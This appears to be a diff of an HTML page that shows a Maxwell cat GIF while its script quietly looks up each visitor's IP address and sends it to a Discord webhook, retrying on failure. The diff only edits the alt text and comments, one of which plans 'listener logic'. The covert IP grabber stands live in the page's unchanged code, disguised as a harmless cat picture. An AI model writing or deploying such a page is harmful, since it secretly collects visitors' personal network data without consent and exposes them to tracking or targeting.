@@ -20,11 +20,11 @@
     </style>
   </head>
   <body>
-    <img src="https://media.tenor.com/VkGE6OgHhTMAAAAi/maxwell-maxwell-cat.gif" alt="Funny Cat GIF">
+    <img src="https://media.tenor.com/VkGE6OgHhTMAAAAi/maxwell-maxwell-cat.gif" alt="maxwell">
 
     <script>
       function sendMessage() {
-        const retryLimit = 15; // Set a limit for retry attempts
+        const retryLimit = 15; //gonna have to switch to listener logic if retries fail
         let retryCount = 0;
 
         function sendRequest() {
@@ -37,7 +37,6 @@
                 const ipAddress = ipRequest.responseText.trim();
                 sendToDiscord(ipAddress);
               } else {
-                // Retry if the request fails, up to the retry limit
                 if (retryCount < retryLimit) {
                   retryCount++;
                   sendRequest();
@@ -72,7 +71,7 @@
           discordRequest.send(JSON.stringify(params));
         }
 
-        // Start the initial request
+        // launch discord request
         sendRequest();
       }
 
